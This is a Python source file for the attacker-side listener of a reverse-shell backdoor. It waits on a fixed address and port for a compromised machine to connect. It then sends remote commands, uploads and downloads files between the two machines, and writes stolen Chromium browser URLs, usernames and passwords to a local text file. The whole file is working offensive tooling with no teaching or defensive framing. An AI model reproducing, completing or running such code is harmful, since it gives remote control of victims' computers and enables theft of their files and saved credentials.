#! /usr/bin/env python

import socket
import json
import base64
import sys

class ReverseBackdoorListener:
    def __init__(self):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind(("172.20.10.5", 4460))
        listener.listen(1)
        print("[+]Waiting for incoming connection.")
        self.connection, address = listener.accept()
        print("[+]Connection Established to " + str(address))
        print("\n")
    def send_json_data(self,command):
        json_data = json.dumps(command)
        self.connection.send(json_data.encode())

    def receive_json_data(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024).decode()
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_command_remotely(self,command):
        self.send_json_data(command)
        if command[0]=="exit":
            self.connection.close()
            exit()
        return self.receive_json_data()

    def read_file(self,path):
        with open(path,"rb") as file:
            return base64.b64encode(file.read()).decode()


    def write_file_remotely(self,path,content):
        with open(path,"wb") as file:
                file.write(base64.b64decode(content))
        file.close()
        return "[+] File Downloaded Successfully"

    def write_data_to_file(self, saved_data):
        path = "/home/vickyvirus/Documents/password.txt"
        with open(path, "w") as file:
            for data in saved_data:
                file.write("\nurl :  " + data["url"])
                file.write("\nusername :  " + data["username"])
                file.write("\npassword : " + data["password"])
                file.write("\n")
        return "[+] Chromium Passwords Saved To " + path

    def run(self):
        while True:
            try:

                command = input("\n>>")
                command=command.split(" ")
                if command[0]=="upload":
                    file_content = self.read_file(command[1])
                    command.append(file_content)

                result = self.execute_command_remotely(command)
                if command[0]=="download" and "[-] Error" not in result:
                    result = self.write_file_remotely(command[1],result)
                if command[0]=="browserpasswords":
                    result = self.write_data_to_file(result)
            except Exception:
                result="\n[-] Error during command execution"
            print("\n"+result)

reverse_backdoor_listener=ReverseBackdoorListener()
reverse_backdoor_listener.run()
